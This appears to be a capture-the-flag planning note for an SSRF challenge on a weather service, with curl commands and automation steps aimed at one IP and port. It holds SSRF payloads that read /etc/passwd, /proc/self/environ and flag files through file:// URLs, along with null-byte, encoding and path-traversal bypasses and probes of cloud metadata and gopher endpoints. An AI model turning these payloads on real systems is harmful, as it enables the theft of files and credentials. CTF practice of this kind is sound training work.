# Port Weather Service Flag Hunting Strategy

## Current Status
- **Target**: 95.216.124.220:32469 (original challenge port)
- **Status**: ❌ Service currently down
- **Port 80**: ✅ Open but not responding properly
- **Alternative**: Monitoring for service restoration

## Flag Extraction Plan

### Phase 1: Immediate SSRF Testing
When service is available, run:
```bash
python3 flag_hunter.py http://95.216.124.220:32469
```

This will automatically test:
- **File Protocol Access**: `file:///flag.txt`, `file:///etc/passwd`, etc.
- **Environment Variables**: `/proc/self/environ`, `/proc/1/environ`
- **Web Files**: `/var/www/html/`, `/var/www/flag.txt`
- **Configuration Files**: `/etc/`, `/home/`, `/opt/`

### Phase 2: SSRF Bypass Techniques
If basic SSRF is blocked:
- **URL Encoding**: `%2f%2fflag.txt`
- **Unicode Encoding**: `f%6cag.txt`
- **Null Bytes**: `flag.txt%00`
- **Path Traversal**: `../../flag.txt`

### Phase 3: Alternative Vectors
- **Cloud Metadata**: AWS, GCP, Aliyun metadata endpoints
- **Internal Services**: localhost, 127.0.0.1 variations
- **Protocol Switching**: ftp://, dict://, gopher://

## Expected Flag Format
Based on other challenges: `CCOI26{...}`

## Common Flag Locations
```
/flag.txt
/app/flag.txt
/home/flag.txt
/tmp/flag.txt
/var/www/flag.txt
/opt/flag.txt
/root/flag.txt
/challenge/flag.txt
/ctf/flag.txt
```

## Monitoring for Service
Run continuous monitoring:
```bash
python3 service_monitor.py 95.216.124.220
```

This will:
- Check original port 32469 every 30 seconds
- Test alternative ports (80, 3000, 8000, etc.)
- Auto-launch flag hunter when service is detected
- Alert when web services become available

## Manual Commands
When service is up:

### Basic SSRF
```bash
curl -X POST http://95.216.124.220:32469/api/weather \
  -d "url=file:///flag.txt"

curl -X POST http://95.216.124.220:32469/api/fetch \
  -d "url=file:///etc/passwd"
```

### Alternative Endpoints
```bash
curl -X POST http://95.216.124.220:32469/api/data \
  -d "url=file:///proc/self/environ"

curl -X GET "http://95.216.124.220:32469?url=file:///flag.txt"
```

### Bypass Attempts
```bash
curl -X POST http://95.216.124.220:32469/api/weather \
  -d "url=file://%2f%2fflag.txt"

curl -X POST http://95.216.124.220:32469/api/weather \
  -d "url=file:///flag.txt%00"
```

## Success Indicators
- Response contains `CCOI26{...}` pattern
- File contents returned instead of weather data
- Different error messages for file vs HTTP requests
- Response time differences indicating file access

## Automation Priority
1. **Monitor service availability** (service_monitor.py)
2. **Automated flag extraction** (flag_hunter.py)
3. **Comprehensive SSRF testing** (ssrf_test.py)
4. **Endpoint discovery** (endpoint_analyzer.py)

## Next Steps
1. Start monitoring: `python3 service_monitor.py 95.216.124.220`
2. When service is detected, flag hunter will auto-launch
3. Monitor output for flag discoveries
4. If no flags found, run manual testing with discovered endpoints

The tools are ready and will automatically extract the flag as soon as the service becomes available.
